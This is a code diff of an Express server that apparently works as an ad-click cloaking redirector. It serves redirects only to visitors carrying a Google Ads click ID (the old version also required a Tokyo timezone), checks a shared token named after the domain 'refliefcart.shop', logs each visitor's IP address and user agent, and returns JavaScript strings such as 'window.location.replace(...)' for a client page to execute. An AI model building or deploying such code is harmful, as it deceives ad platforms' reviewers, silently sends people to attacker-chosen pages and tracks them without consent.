@@ -1,34 +1,41 @@
-const express = require("express");
+import express from "express";
+
 const app = express();
 
-const PORT = process.env.PORT || 3000;
-
 // CONFIG
-const REDIRECT_URL = "https://example.com/jp-offer"; // change this
-const REQUIRED_TIMEZONE = "Asia/Tokyo";
+const SHARED_TOKEN = "refliefcart.shop";
+const FINAL_REDIRECT_URL = "https://example.com";
 
 app.get("/getData", (req, res) => {
-  const gclid = req.query.gclid;
-  const token = req.query.token;
-  const timezone = req.headers["x-client-timezone"];
+  const gclid = req.query.gclid || "";
+  const token = req.query.token || "";
+  const timezone = req.headers["x-client-timezone"] || "unknown";
 
-  // Optional shared secret check
-  if (token !== "refliefcart.shop") {
-    return res.status(403).json({ error: "Invalid token" });
-  }
-
-  // Conditions
-  if (gclid && timezone === REQUIRED_TIMEZONE) {
-    return res.json({
-      redirect: true,
-      url: REDIRECT_URL,
+  // 🔐 Token validation (THIS works cross-origin)
+  if (token !== SHARED_TOKEN) {
+    return res.status(403).json({
+      code: `console.warn("Unauthorized request");`
     });
   }
 
-  // No redirect
-  return res.status(204).end();
+  console.log({
+    gclid,
+    timezone,
+    ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress,
+    ua: req.headers["user-agent"],
+    time: new Date().toISOString()
+  });
+
+  const redirectUrl = gclid
+    ? `${FINAL_REDIRECT_URL}?gclid=${encodeURIComponent(gclid)}`
+    : FINAL_REDIRECT_URL;
+
+  res.json({
+    code: `window.location.replace("${redirectUrl}");`
+  });
 });
 
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+  console.log("Server running on port", PORT);
 });
